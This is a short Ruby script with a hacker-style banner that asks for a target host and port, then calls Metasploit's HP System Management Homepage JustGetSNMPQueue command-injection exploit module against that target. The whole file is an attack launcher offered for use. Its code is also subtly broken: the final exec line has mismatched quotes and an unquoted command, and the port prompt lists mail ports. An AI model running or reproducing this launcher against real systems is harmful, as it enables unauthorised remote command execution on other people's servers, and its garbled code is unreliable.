require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
    HP System Management Homepage
  JustGetSNMPQueue Command Injection
""".red
puts """
	 1st Try {set RPORT 2381; 2nd RPORT ?}""".white


puts " [?] What is the target? "
print "[!] --->"
target = gets.chomp

puts " [?] Which SNMP server port (e.g. 25, 465, 587, 2525)? "
print " [!] ---> "
port = gets.chomp




exec(msfconsole -x "exploit/multi/http/hp_sys_mgmt_exec' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

